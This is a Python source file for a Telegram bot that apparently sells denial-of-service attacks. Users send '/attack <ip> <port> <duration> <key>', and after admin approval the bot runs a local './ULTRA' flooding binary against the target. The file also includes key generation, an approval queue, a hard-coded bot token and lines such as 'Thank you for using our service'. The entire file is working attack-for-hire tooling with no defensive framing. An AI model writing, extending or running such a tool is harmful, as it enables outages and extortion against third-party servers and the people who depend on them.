import os
import asyncio
import random
import string
import time
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from telegram.error import TelegramError

TELEGRAM_BOT_TOKEN = '7248127599:AAHwkME4J8unx-hS7dfiXTwgLfM2VsLfjAY'
ALLOWED_USER_ID = 6135948216
bot_access_free = True  

# Store pending attack requests and keys
pending_requests = {}
user_keys = {}

# Key expiry time (in seconds)
KEY_EXPIRY_TIME = 300  # 5 minutes

def generate_key():
    """Generate a random key."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration> <key>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./ULTRA {ip} {port} {duration} 20",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user issuing the command

    # Check if the user is allowed to use the bot
    if user_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 4:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration> <key>*", parse_mode='Markdown')
        return

    ip, port, duration, key = args

    # Check if user has a valid key
    if chat_id not in user_keys or user_keys[chat_id]['expiry'] < time.time():
        await context.bot.send_message(chat_id=chat_id, text="*❌ You don't have a valid key! Please generate a new one with /genkey.*", parse_mode='Markdown')
        return

    if key != user_keys[chat_id]['key']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid key. Please try again.*", parse_mode='Markdown')
        return

    # Add pending request
    pending_requests[chat_id] = (ip, port, duration)

    # Notify the admin (ALLOWED_USER_ID)
    await context.bot.send_message(
        chat_id=ALLOWED_USER_ID,
        text=f"*⚔️ Attack Request Received! ⚔️*\n"
             f"*User: {chat_id}*\n"
             f"*Target: {ip}:{port}*\n"
             f"*Duration: {duration} seconds*\n\n"
             "Do you approve or disapprove this request? Use /approve <user_id> or /disapprove <user_id>."
    )

    await context.bot.send_message(
        chat_id=chat_id,
        text="*⚔️ Your attack request is waiting for approval...*",
        parse_mode='Markdown'
    )

async def approve(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    if chat_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to approve attacks!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /approve <user_id>*", parse_mode='Markdown')
        return

    user_id = context.args[0]

    # Check if there is a pending request
    if user_id not in pending_requests:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No pending attack requests for this user.*", parse_mode='Markdown')
        return

    ip, port, duration = pending_requests[user_id]
    # Proceed to launch the attack
    await context.bot.send_message(chat_id=user_id, text=f"*⚔️ Attack Approved! ⚔️*\n"
                                                           f"Launching attack on {ip}:{port} for {duration} seconds...")
    asyncio.create_task(run_attack(user_id, ip, port, duration, context))

    # Remove the pending request after approval
    del pending_requests[user_id]

async def disapprove(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    if chat_id != ALLOWED_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to disapprove attacks!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /disapprove <user_id>*", parse_mode='Markdown')
        return

    user_id = context.args[0]

    # Check if there is a pending request
    if user_id not in pending_requests:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ No pending attack requests for this user.*", parse_mode='Markdown')
        return

    # Notify the user about disapproval
    await context.bot.send_message(user_id, text="*❌ Your attack request has been disapproved.*")
    
    # Remove the pending request after disapproval
    del pending_requests[user_id]

async def genkey(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id

    # Generate a new key for the user
    key = generate_key()

    # Set the key expiration time
    user_keys[chat_id] = {'key': key, 'expiry': time.time() + KEY_EXPIRY_TIME}

    # Send the generated key to the user
    await context.bot.send_message(
        chat_id=chat_id,
        text=f"*🔑 Your key: {key}* \n"
             f"*🕒 This key will expire in {KEY_EXPIRY_TIME // 60} minutes.*",
        parse_mode='Markdown'
    )

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("disapprove", disapprove))
    application.add_handler(CommandHandler("genkey", genkey))

    application.run_polling()

if __name__ == '__main__':
    main()
